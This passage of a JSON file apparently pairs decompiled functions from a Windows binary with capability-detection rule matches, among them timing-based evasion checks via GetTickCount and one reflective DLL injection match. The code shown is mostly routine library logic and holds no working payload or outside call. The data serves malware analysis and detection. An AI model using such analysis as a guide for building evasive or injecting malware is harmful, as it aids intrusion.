+ 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x5b;\n            uVar3 = 0x5b;\n        }\n        *(arg1 + 0x108) = uVar3;\n        fcn.1400113f0(arg1, 0x11, arg3_00);\n        cVar4 = pcVar2[1];\n        if (cVar4 == 'X') {\n            puVar7 = 0x14010cc32;\n            iVar5 = *(arg1 + 0x100);\n            do {\n                uVar3 = *puVar7;\n                if (iVar5 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar6 = 1;\n                    iVar5 = 0;\n                }\n                else {\n                    iVar6 = iVar5 + 1;\n                }\n                puVar7 = puVar7 + 1;\n                *(arg1 + 0x100) = iVar6;\n                *(arg1 + iVar5) = uVar3;\n                *(arg1 + 0x108) = uVar3;\n                iVar5 = iVar6;\n            } while (puVar7 != 0x14010cc37);\n            fcn.1400113f0(arg1, 0x11, *(arg3_01 + 4));\n            arg3_01 = *(arg3_01 + 6);\n            cVar4 = pcVar2[1];\n        }\n        if (cVar4 != 'i') {\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x5d;\n            *(arg1 + 0x108) = 0x5d;\n        }\n        if ((((*arg3_01 & 0xfffffffd) == 0x38) && (***(*(arg3_01 + 4) + 0x10) == 'd')) &&\n           ((uVar1 = (**(*(arg3_01 + 4) + 0x10))[1],  (uVar1 & 0xdf) == 0x58 || (uVar1 == 0x69)))) {\n            fcn.1400113f0(arg1, 0x11, arg3_01);\n        }\n        else {\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x3d;\n            *(arg1 + 0x108) = 0x3d;\n            fcn.140012d80(arg1, 0x11, arg3_01);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1383
    },
    "1400147b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400147b0(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 183
    },
    "140017ff": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140017ff0(int64_t arg1, ulong arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uchar auStack88 [24];\n    \n    fcn.14001dfa0(auStack88, 0);\n    iVar1 = *(arg3 + 2);\n    iVar2 = iVar1;\n    if (arg2 <= iVar1) {\n        iVar2 = arg2;\n    }\n    if (-1 < iVar1) {\n        arg2._0_4_ = iVar2;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar1 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar1;\n        if ((*(arg3 + 9) & 4) == 0) {\n            *(arg3 + 0xc) = iVar1 + -1;\n            do {\n                fcn.140017f90(0x20, arg3);\n                iVar1 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar1 + -1;\n            } while (iVar1 != 0);\n            if (arg2 < 1) goto code_r0x0001400180fd;\n        }\n        else if (arg2 < 1) {\n            *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n            goto code_r0x0001400180f0;\n        }\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\n        if (arg2 < 1) {\n            *(arg3 + 0xc) = 0xfffffffe;\n            return;\n        }\n    }\n    iVar3 = 0;\n    do {\n        iVar1 = fcn.14001dfa0(auStack88, *(arg1 + iVar3 * 2));\n        if (iVar1 < 1) goto code_r0x0001400180fd;\n        puVar4 = auStack88;\n        do {\n            while( true ) {\n                puVar5 = puVar4 + 1;\n                if (((*(arg3 + 1) & 0x4000) != 0) ||\n                   (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) break;\ncode_r0x00014001808a:\n                *(arg3 + 0x24) = iVar2 + 1;\n                puVar4 = puVar5;\n                if (puVar5 == auStack88 + (iVar1 - 1) + 1) goto code_r0x0001400180cc;\n            }\n            if ((*(arg3 + 1) & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar4;\n                iVar2 = *(arg3 + 0x24);\n                goto code_r0x00014001808a;\n            }\n            sub.msvcrt.dll_fputc();\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            puVar4 = puVar5;\n        } while (puVar5 != auStack88 + (iVar1 - 1) + 1);\ncode_r0x0001400180cc:\n        iVar3 = iVar3 + 1;\n    } while (0 < arg2 - iVar3);\n    iVar1 = *(arg3 + 0xc);\n    *(arg3 + 0xc) = iVar1 + -1;\n    if (iVar1 < 1) {\n        return;\n    }\ncode_r0x0001400180f0:\n    do {\n        fcn.140017f90(0x20, arg3);\ncode_r0x0001400180fd:\n        iVar1 = *(arg3 + 0xc);\n        *(arg3 + 0xc) = iVar1 + -1;\n    } while (0 < iVar1);\n    return;\n}\n",
        "token_count": 911
    },
    "14001818": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140018180(uchar *arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar1 = *(arg3 + 2);\n    uVar3 = uVar1;\n    if (arg2 <= uVar1) {\n        uVar3 = arg2;\n    }\n    if (-1 < uVar1) {\n        arg2._0_4_ = uVar3;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar2 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar2;\n        uVar1 = *(arg3 + 1);\n        if ((uVar1 & 0x400) == 0) {\n            *(arg3 + 0xc) = iVar2 + -1;\n            do {\n                fcn.140017f90(0x20, arg3);\n                iVar2 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar2 + -1;\n            } while (iVar2 != 0);\n            if (arg2 == 0) goto code_r0x000140018221;\n            goto code_r0x0001400181be;\n        }\n        if (arg2 == 0) {\n            *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n            goto code_r0x000140018231;\n        }\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\n        if (arg2 == 0) {\n            *(arg3 + 0xc) = 0xfffffffe;\n            return;\n        }\ncode_r0x0001400181be:\n        uVar1 = *(arg3 + 1);\n    }\n    puVar4 = arg1;\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar4;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n        if (puVar4 + 1 == arg1 + arg2) break;\n        uVar1 = *(arg3 + 1);\n        puVar4 = puVar4 + 1;\n    }\ncode_r0x000140018221:\n    while (iVar2 = *(arg3 + 0xc),  *(arg3 + 0xc) = iVar2 + -1,  0 < iVar2) {\n        uVar1 = *(arg3 + 1);\ncode_r0x000140018231:\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 863
    },
    "14001a47": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.14001a470(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (0x1b < arg1) {\n        iVar1 = 4;\n        do {\n            iVar1 = iVar1 * 2;\n            uVar3 = uVar3 + 1;\n        } while (iVar1 + 0x17 < arg1);\n    }\n    puVar2 = fcn.14001ceb0(uVar3);\n    *puVar2 = uVar3;\n    return puVar2 + 1;\n}\n",
        "token_count": 148
    },
    "14001dd4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14001dd40(uint64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    uVar1 = fcn.14001def0(0);\n    if (uVar1 <= arg1) {\n        uVar1 = fcn.14001def0(0x13);\n        if (arg1 <= uVar1) {\n            iVar2 = fcn.14001def0(0);\n            sub.msvcrt.dll__lock((arg1 - iVar2 >> 4) * -0x55555555 + 0x10);\n            *(arg1 + 0x18) = *(arg1 + 0x18) | 0x8000;\n            return;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00014001dd6c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 225
    },
    "14001ddb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14001ddb0(uint64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    uVar1 = fcn.14001def0(0);\n    if (uVar1 <= arg1) {\n        uVar1 = fcn.14001def0(0x13);\n        if (arg1 <= uVar1) {\n            *(arg1 + 0x18) = *(arg1 + 0x18) & 0xffff7fff;\n            iVar2 = fcn.14001def0(0);\n    // WARNING: Could not recover jumptable at 0x00014001e4a8. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll__unlock)((arg1 - iVar2 >> 4) * -0x55555555 + 0x10);\n            return;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00014001dddc. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 265
    },
    "14001f54": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.14001f540(ulong arg1, int64_t arg2)\n\n{\n    if (arg1 == 0xff) {\n        return 0;\n    }\n    arg1._0_1_ = arg1 & 0x70;\n    if (arg1 != 0x30) {\n        if (arg1 < 0x31) {\n            if (arg1 == 0x20) {\n                return *(*(arg2 + 0x20) + 8);\n            }\n            if (arg1 < 0x21) {\n                return 0;\n            }\n        }\n        else {\n            if (arg1 == 0x40) {\n                return **(*(arg2 + 0x20) + 0x10) + *(*(arg2 + 0x20) + 8);\n            }\n            if (arg1 == 0x50) {\n                return 0;\n            }\n        }\n        sub.msvcrt.dll_abort();\n    }\n    return 0;\n}\n",
        "token_count": 220
    },
    "1400bcb1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400bcb10(int64_t arg1)\n\n{\n    uint64_t arg1_00;\n    \n    arg1_00 = arg1 - 0xa0;\n    if ((*0x140106bb8 < arg1_00) && (arg1_00 < *0x140106bb8 + *0x140106bc0)) {\n        fcn.14001fff0(arg1_00);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_free)();\n    return;\n}\n",
        "token_count": 148
    },
    "14002015": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t * fcn.140020150(uint64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t *puVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint64_t **ppuVar6;\n    uint64_t uVar7;\n    \n    piVar1 = *0x14010fc90;\n    iVar2 = **0x14010fc90;\n    if (iVar2 != 0) goto code_r0x000140020210;\n    puVar3 = arg1 + 2;\n    if (puVar3 < 0x10) {\n        puVar3 = 0x10;\n    }\n    if (*0x140106bb0 == NULL) {\n        return NULL;\n    }\n    do {\n        uVar4 = puVar3 + 0xfU & 0xfffffffffffffff0;\n        ppuVar6 = 0x140106bb0;\n        arg1 = *0x140106bb0;\n        do {\n            if (uVar4 <= *arg1) {\n                uVar7 = *arg1 - uVar4;\n                if (uVar7 < 0x10) {\n                    *arg1 = *arg1;\n                    puVar3 = arg1[1];\n                }\n                else {\n                    puVar3 = arg1 + uVar4;\n                    puVar3[1] = arg1[1];\n                    arg1 = *ppuVar6;\n                    *puVar3 = uVar7;\n                    *arg1 = uVar4;\n                }\n                *ppuVar6 = puVar3;\n                arg1 = arg1 + 2;\n                break;\n            }\n            ppuVar6 = arg1 + 1;\n            arg1 = arg1[1];\n        } while (arg1 != NULL);\n        do {\n            if (iVar2 == 0) {\n                return arg1;\n            }\n            iVar2 = fcn.1400149e0(0x140106ba0);\n            if (iVar2 == 0) {\n                return arg1;\n            }\n            fcn.140021df0();\ncode_r0x000140020210:\n            uVar5 = 0x40106ba0;\n            iVar2 = fcn.140014970(0x140106ba0);\n            if (iVar2 != 0) {\n                fcn.140021dc0();\n                switch(uVar5 & 0x7d) {\n                default:\n                    return NULL;\n                case 1:\n                case 0x11:\n                    return 0x14010de38;\n                case 5:\n                case 0x15:\n                    return 0x14010de59;\n                case 8:\n                    return 0x14010de3e;\n                case 9:\n                case 0x19:\n                    return 0x14010de4a;\n                case 0xc:\n                    return 0x14010de35;\n                case 0xd:\n                case 0x1d:\n                    return 0x14010de3a;\n                case 0x10:\n                case 0x30:\n                    return 0x14010de30;\n                case 0x14:\n                case 0x34:\n                    return 0x14010de52;\n                case 0x18:\n                    return 0x14010de40;\n                case 0x1c:\n                    return 0x14010de5c;\n                case 0x38:\n                    return 0x14010de43;\n                case 0x3c:\n                    return 0x14010de60;\n                case 0x50:\n                case 0x70:\n                    return 0x14010de32;\n                case 0x54:\n                    return 0x14010de55;\n                case 0x78:\n                    return 0x14010de46;\n                case 0x7c:\n                    return \"w+bx\";\n                }\n            }\n            puVar3 = arg1 + 2;\n            iVar2 = *piVar1;\n            if (puVar3 < 0x10) {\n                puVar3 = 0x10;\n            }\n            arg1 = *0x140106bb0;\n        } while (*0x140106bb0 == NULL);\n    } while( true );\n}\n",
        "token_count": 946
    },
    "140029ee": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140029ee0(int64_t **arg1, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    bool bVar2;\n    bool bVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    bool bVar5;\n    \n    piVar1 = *arg1;\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    bVar2 = piVar1 != NULL && *(arg1 + 1) == -1;\n    bVar5 = *(arg1 + 1) == -1;\n    if (bVar2) {\n        if (piVar1[2] < piVar1[3]) {\n            uVar4 = *piVar1[2];\n        }\n        else {\n            uVar4 = (**(*piVar1 + 0x48))();\n        }\n        bVar5 = false;\n        if (uVar4 == -1) {\n            *arg1 = NULL;\n            bVar5 = bVar2;\n        }\n    }\n    piVar1 = *arg2;\n    uVar4 = uVar4 & 0xffffffffffffff00;\n    bVar3 = piVar1 != NULL && *(arg2 + 1) == -1;\n    bVar2 = *(arg2 + 1) == -1;\n    if (bVar3) {\n        if (piVar1[2] < piVar1[3]) {\n            uVar4 = *piVar1[2];\n        }\n        else {\n            uVar4 = (**(*piVar1 + 0x48))();\n        }\n        bVar2 = false;\n        if (uVar4 == -1) {\n            *arg2 = NULL;\n            bVar2 = bVar3;\n        }\n    }\n    return uVar4 & 0xffffffffffffff00 | bVar5 == bVar2;\n}\n",
        "token_count": 413
    },
    "140029f9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140029f90(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    \n    piVar1 = *arg1;\n    if ((*(arg1 + 1) == -1) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            iVar2 = *piVar1[2];\n        }\n        else {\n            iVar2 = (**(*piVar1 + 0x48))();\n        }\n        if (iVar2 == -1) {\n            *arg1 = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "14002b9d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14002b9d0(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    \n    fcn.14002b2c0(arg1);\n    if (*(*arg1 + 0x30) == 0x14002bab0) {\n        return arg2;\n    }\n    // WARNING: Could not recover jumptable at 0x00014002ba0e. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**(*arg1 + 0x30))(arg1, arg2);\n    return uVar1;\n}\n",
        "token_count": 140
    },
    "14002fcd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14002fcd0(ulong *arg1, ulong s)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = arg1[1];\n    uVar1 = sub.msvcrt.dll_strlen(s);\n    uVar2 = uVar3;\n    if (uVar1 <= uVar3) {\n        uVar2 = uVar1;\n    }\n    if ((uVar2 != 0) && (uVar2 = sub.msvcrt.dll_memcmp(*arg1, s),  uVar2 != 0)) {\n        return uVar2;\n    }\n    uVar3 = uVar3 - uVar1;\n    uVar2 = 0x7fffffff;\n    if ((uVar3 < 0x80000000) && (uVar2 = 0x80000000,  -0x80000001 < uVar3)) {\n        uVar2 = uVar3 & 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 234
    },
    "14007221": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140072210(int64_t arg1, int64_t s2)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = 1;\n    if (s2 != arg1) {\n        uVar1 = 0;\n        if (**(arg1 + 8) != '*') {\n            uVar1 = sub.msvcrt.dll_strcmp(*(arg1 + 8), *(s2 + 8) + (**(s2 + 8) == '*'));\n            uVar1 = uVar1 & 0xffffffffffffff00 | uVar1 == 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "1400742e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400742e0(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack25 [9];\n    \n    iVar4 = *arg1;\n    if (*(iVar4 + -0x10) <= *(iVar4 + -0x18)) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar3 = fcn.140072b30(iVar4 + -0x18, auStack25, 0);\n    iVar4 = *arg1;\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400bc6c0(iVar4 + -0x18);\n    }\n    *arg1 = iVar3;\n    return;\n}\n",
        "token_count": 318
    },
    "1400746a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400746a0(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\n    arg2_00 = iVar2 + 1;\n    if (arg2_00 <= *(iVar1 + -0x10)) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar1 + -8) < 1) goto code_r0x0001400746e5;\n        }\n        else if (*(iVar1 + -8) < 1) {\n            iVar1 = *arg1;\n            iVar2 = *(iVar1 + -0x18);\n            goto code_r0x0001400746e5;\n        }\n    }\n    fcn.1400743c0(arg1, arg2_00);\n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\ncode_r0x0001400746e5:\n    *(iVar1 + iVar2 * 2) = arg2;\n    *(iVar1 + -8) = 0;\n    *(iVar1 + -0x18) = arg2_00;\n    *(iVar1 + arg2_00 * 2) = 0;\n    return;\n}\n",
        "token_count": 304
    },
    "14007c9d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.14007c9d0(int64_t *arg1, int64_t *arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack25 [9];\n    \n    piVar1 = *0x14010fc90;\n    iVar4 = *arg2;\n    if (*arg1 != iVar4) {\n        if (*(iVar4 + -8) < 0) {\n            iVar4 = fcn.14007c020(iVar4 + -0x18, auStack25, 0);\n            iVar3 = *arg1;\n            iVar2 = **0x14010fc90;\n        }\n        else {\n            if (**0x14010fc90 == 0) {\n                *(iVar4 + -8) = *(iVar4 + -8) + 1;\n            }\n            else {\n                LOCK();\n                *(iVar4 + -8) = *(iVar4 + -8) + 1;\n            }\n            iVar2 = *piVar1;\n            iVar3 = *arg1;\n        }\n        if (iVar2 == 0) {\n            iVar2 = *(iVar3 + -8);\n            *(iVar3 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iVar3 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.1400bc6c0(iVar3 + -0x18);\n        }\n        *arg1 = iVar4;\n        return arg1;\n    }\n    return arg1;\n}\n",
        "token_count": 380
    },
    "14007d6b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14007d6b0(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack25 [9];\n    \n    iVar4 = *arg1;\n    if (*(iVar4 + -0x10) <= *(iVar4 + -0x18)) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n        }\n        else {\n            if (*(iVar4 + -8) < 1) {\n                return;\n            }\n            iVar4 = *arg1;\n        }\n    }\n    iVar3 = fcn.14007c020(iVar4 + -0x18, auStack25, 0);\n    iVar4 = *arg1;\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(iVar4 + -8);\n        *(iVar4 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar4 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.1400bc6c0(iVar4 + -0x18);\n    }\n    *arg1 = iVar3;\n    return;\n}\n",
        "token_count": 319
    },
    "14007da4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14007da40(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\n    arg2_00 = iVar2 + 1;\n    if (arg2_00 <= *(iVar1 + -0x10)) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar1 + -8) < 1) goto code_r0x00014007da85;\n        }\n        else if (*(iVar1 + -8) < 1) {\n            iVar1 = *arg1;\n            iVar2 = *(iVar1 + -0x18);\n            goto code_r0x00014007da85;\n        }\n    }\n    fcn.14007d790(arg1, arg2_00);\n    iVar1 = *arg1;\n    iVar2 = *(iVar1 + -0x18);\ncode_r0x00014007da85:\n    *(iVar1 + iVar2) = arg2;\n    iVar1 = *arg1;\n    *(iVar1 + -8) = 0;\n    *(iVar1 + -0x18) = arg2_00;\n    *(iVar1 + arg2_00) = 0;\n    return;\n}\n",
        "token_count": 301
    },
    "14008026": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140080260(ulong *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    iVar1 = arg1[4];\n    *arg1 = 0x1401179f0;\n    iVar3 = fcn.1400a5670();\n    if ((iVar1 != iVar3) && (iVar1 != 0)) {\n        fcn.1400bc6b0(iVar1);\n    }\n    piVar2 = arg1[2];\n    if (piVar2 != NULL) {\n        if (*(*piVar2 + 8) == 0x14009ed00) {\n            *piVar2 = 0x140118650;\n            fcn.1400a5790(piVar2);\n            fcn.1400bc6c0(piVar2);\n        }\n        else {\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    fcn.1400a5760(arg1 + 3);\n    return;\n}\n",
        "token_count": 232
    },
    "140080ac": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140080ac0(ulong *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    iVar1 = arg1[4];\n    *arg1 = 0x140117a10;\n    iVar3 = fcn.1400a5670();\n    if ((iVar1 != iVar3) && (iVar1 != 0)) {\n        fcn.1400bc6b0(iVar1);\n    }\n    piVar2 = arg1[2];\n    if (piVar2 != NULL) {\n        if (*(*piVar2 + 8) == 0x14009eed0) {\n            *piVar2 = 0x140118670;\n            fcn.1400a5790(piVar2);\n            fcn.1400bc6c0(piVar2);\n        }\n        else {\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    fcn.1400a5760(arg1 + 3);\n    return;\n}\n",
        "token_count": 232
    },
    "14008777": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140087770(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uchar uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [24];\n    \n    uVar1 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar1;\n    uVar1 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x88) = 1;\n    *(arg3 + 0x49) = uVar1;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    (**(iVar3 + 0x20))(&puStack88, arg2);\n    iVar3 = iStack80;\n    iVar2 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar2, iVar3, 0);\n    *(iVar2 + iVar3) = 0;\n    *(arg3 + 0x18) = iVar3;\n    *(arg3 + 0x10) = iVar2;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar3 = iStack80;\n    iVar2 = fcn.1400bc6e0(iStack80 + 1);\n    fcn.14002f850(&puStack88, iVar2, iVar3, 0);\n    *(iVar2 + iVar3) = 0;\n    *(arg3 + 0x28) = iVar2;\n    *(arg3 + 0x30) = iVar3;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    